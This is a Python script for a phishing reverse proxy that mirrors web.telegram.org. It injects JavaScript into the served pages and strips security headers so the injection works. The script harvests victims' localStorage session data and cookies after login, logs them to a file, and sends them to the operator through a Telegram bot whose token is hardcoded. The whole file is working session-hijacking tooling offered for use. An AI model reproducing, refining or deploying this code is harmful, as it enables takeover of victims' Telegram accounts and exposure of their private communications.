"""Reverse proxy to web.telegram.org that injects session-capture JS.

Serves the REAL Telegram Web (1:1) and exfiltrates the victim's session
(localStorage + cookies) to /exfil after login.
"""

import asyncio
import os
import ssl
import json
import time
import threading
import urllib.request
import urllib.parse
from aiohttp import web, ClientSession, ClientTimeout

BOT_TOKEN = "8940193741:AAE4BCvVtO7G_QnuC7G_c0nlPbcfyEisf-I"
_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode = ssl.CERT_NONE

OWNER_FILE = "owner_chat_id.txt"
_owner = {"id": None}
_owner_lock = threading.Lock()

def _load_owner():
    # env var takes priority (for hosting platforms)
    env = os.environ.get("OWNER_CHAT_ID")
    if env:
        try:
            _owner["id"] = int(env)
            print(f"[bot] owner chat_id from env: {_owner['id']}", flush=True)
            return
        except ValueError:
            pass
    try:
        with open(OWNER_FILE) as f:
            v = f.read().strip()
            if v:
                _owner["id"] = int(v)
    except Exception:
        pass

def _save_owner(cid):
    try:
        with open(OWNER_FILE, "w") as f:
            f.write(str(cid))
    except Exception:
        pass

_load_owner()

def get_owner():
    with _owner_lock:
        return _owner["id"]

def set_owner(cid):
    with _owner_lock:
        if _owner["id"] is None:
            _owner["id"] = cid
            _save_owner(cid)
            print(f"[bot] owner chat_id captured: {cid}", flush=True)

def bot_send(chat_id, text):
    if not BOT_TOKEN or not chat_id:
        return False
    try:
        data = urllib.parse.urlencode({"chat_id": chat_id, "text": text}).encode()
        req = urllib.request.Request(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=data, method="POST"
        )
        with urllib.request.urlopen(req, timeout=15, context=_SSL_CTX) as resp:
            return resp.status == 200
    except Exception as e:
        print(f"[bot send] {e}", flush=True)
        return False

def bot_deliver(session_data):
    cid = get_owner()
    if not cid:
        print("[bot] no owner chat_id yet — send /start to the bot first", flush=True)
        return False
    text = "🔓 Captured Telegram session\n" + json.dumps(session_data, ensure_ascii=False)[:3500]
    return bot_send(cid, text)

def poll_updates():
    if not BOT_TOKEN:
        return
    offset = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?timeout=30&offset={offset}"
            with urllib.request.urlopen(url, timeout=40, context=_SSL_CTX) as resp:
                data = json.loads(resp.read())
            for upd in data.get("result", []):
                offset = upd["update_id"] + 1
                msg = upd.get("message") or upd.get("edited_message")
                if not msg:
                    continue
                chat = msg.get("chat", {})
                cid = chat.get("id")
                text = (msg.get("text") or "").strip()
                if text.startswith("/start"):
                    set_owner(cid)
                    bot_send(cid, "✅ Connected. You will receive captured sessions here.")
        except Exception as e:
            print(f"[bot poll] {e}", flush=True)
            time.sleep(5)

UPSTREAM = "https://web.telegram.org"
PORT = int(os.environ.get("PORT", 8095))
EXFIL_FILE = "captured_sessions.txt"

os.makedirs(os.path.dirname(__file__) if os.path.dirname(__file__) else ".", exist_ok=True)

CAPTURE_JS = r"""
(function(){
  var sent = false;
  function collect(){
    try {
      var ls = {};
      for (var i=0;i<localStorage.length;i++){
        var k = localStorage.key(i);
        ls[k] = localStorage.getItem(k);
      }
      var cookies = document.cookie;
      return {localStorage: ls, cookies: cookies, url: location.href};
    } catch(e){ return {error: String(e)}; }
  }
  function exfil(){
    if (sent) return;
    var data = collect();
    // only send if there's something that looks like a session
    var hasAuth = false;
    for (var k in data.localStorage){
      if (/auth|session|token|dc/i.test(k)) hasAuth = true;
      if (data.localStorage[k] && data.localStorage[k].length > 80) hasAuth = true;
    }
    if (!hasAuth) return;
    sent = true;
    try {
      fetch('/exfil', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(data), keepalive:true});
    } catch(e){}
  }
  // poll until logged in
  setInterval(function(){
    // detect login: chat list present or main app container
    if (document.querySelector('.chat-list, .sidebar, .im_page_wrap, #column-center, .tgme_page, [class*="ChatList"]')) {
      exfil();
    }
  }, 2000);
  // also try on visibility change
  document.addEventListener('visibilitychange', function(){ if(!document.hidden) exfil(); });
})();
"""

async def exfil_handler(request):
    try:
        data = await request.json()
    except Exception:
        data = {"raw": (await request.text())}
    import json as _json
    line = _json.dumps(data, ensure_ascii=False)
    with open(EXFIL_FILE, "a", encoding="utf-8") as f:
        f.write(line + "\n")
    print("\n" + "="*60)
    print("[CAPTURED SESSION]")
    print(line[:2000])
    print("="*60)
    # deliver to bot
    try:
        bot_deliver(data)
    except Exception as e:
        print(f"[bot deliver] {e}", flush=True)
    return web.Response(text="ok")

async def proxy(request):
    # serve local capture script
    if request.path == "/exfil.js":
        return web.Response(text=CAPTURE_JS, content_type="application/javascript")
    # exfil endpoint
    if request.path == "/exfil" and request.method == "POST":
        return await exfil_handler(request)
    # redirect root to /k/ (modern Telegram Web)
    if request.path == "/" or request.path == "":
        raise web.HTTPFound(location="/k/")

    url = UPSTREAM + request.rel_url.path_qs
    headers = {k: v for k, v in request.headers.items()
               if k.lower() not in ("host", "connection", "content-length", "accept-encoding")}
    headers["Host"] = "web.telegram.org"
    # disable compression so we can inject
    headers["Accept-Encoding"] = "identity"

    async with ClientSession(timeout=ClientTimeout(total=60)) as session:
        body = await request.read()
        async with session.request(request.method, url, headers=headers, data=body if body else None, ssl=False) as resp:
            content_type = resp.headers.get("Content-Type", "")
            data = await resp.read()
            # inject into HTML
            if "text/html" in content_type:
                text = data.decode("utf-8", errors="replace")
                inject = '<script src="/exfil.js"></script>'
                if "</head>" in text:
                    text = text.replace("</head>", inject + "</head>", 1)
                elif "<body" in text:
                    text = text.replace("<body", inject + "<body", 1)
                data = text.encode("utf-8")
            # build response headers (strip CSP, security headers that block injection)
            out_headers = {}
            for k, v in resp.headers.items():
                kl = k.lower()
                if kl in ("content-security-policy", "content-security-policy-report-only",
                          "x-frame-options", "content-encoding", "transfer-encoding",
                          "content-length", "connection"):
                    continue
                out_headers[k] = v
            out_headers["Content-Length"] = str(len(data))
            return web.Response(status=resp.status, body=data, headers=out_headers)

def main():
    t = threading.Thread(target=poll_updates, daemon=True)
    t.start()
    app = web.Application()
    app.router.add_route("*", "/{path:.*}", proxy)
    web.run_app(app, host="0.0.0.0", port=PORT)

if __name__ == "__main__":
    main()
